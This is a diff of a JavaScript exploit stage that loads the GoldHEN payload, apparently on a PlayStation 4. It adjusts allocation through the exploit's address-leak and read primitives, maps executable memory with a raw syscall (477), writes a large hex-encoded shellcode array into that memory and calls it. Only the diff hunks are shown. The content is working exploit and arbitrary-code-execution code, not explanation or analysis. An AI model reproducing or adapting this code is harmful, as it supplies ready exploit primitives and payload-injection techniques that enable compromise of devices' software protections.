@@ -23,7 +23,7 @@ var stagegold = function () {
 	};
 
 	p.malloc = function malloc(sz) {
-		var backing = new Uint8Array(sz);
+		var backing = new Uint8Array(0x10000 + sz);
 		window.nogc.push(backing);
 		var ptr = p.read8(p.leakval(backing).add32(0x10));
 		ptr.backing = backing;
@@ -31,7 +31,7 @@ var stagegold = function () {
 	}
 
 	p.malloc32 = function malloc32(sz) {
-		var backing = new Uint8Array(sz * 4);
+		var backing = new Uint8Array(0x10000 + sz * 4);
 		window.nogc.push(backing);
 		var ptr = p.read8(p.leakval(backing).add32(0x10));
 		ptr.backing = new Uint32Array(backing.buffer);
@@ -173,6 +173,11 @@ var stagegold = function () {
 	}
 		var payload_buffer = p.syscall(477, 0, 0x46000, 7, 0x41000, -1, 0);
         var payload_writer = p.arrayFromAddress(payload_buffer, 0x11800);
+
+
+
+
+
 payload_writer[0] = 0x0011D2E9;
 payload_writer[1] = 0x1E0FF300;
 payload_writer[2] = 0x04BA55FA;
@@ -71221,6 +71226,8 @@ payload_writer[71044] = 0x32663565;
 payload_writer[71045] = 0x37316335;
 payload_writer[71046] = 0x63373830;
 payload_writer[71047] = 0x33623765;
+
+
 p.fcall(payload_buffer);
-window.progress.innerHTML="<div>GoldHEN V2.4 Loaded ✓</div>";
+window.progress.innerHTML="<div>GoldHEN Loaded ✓</div>";
 }
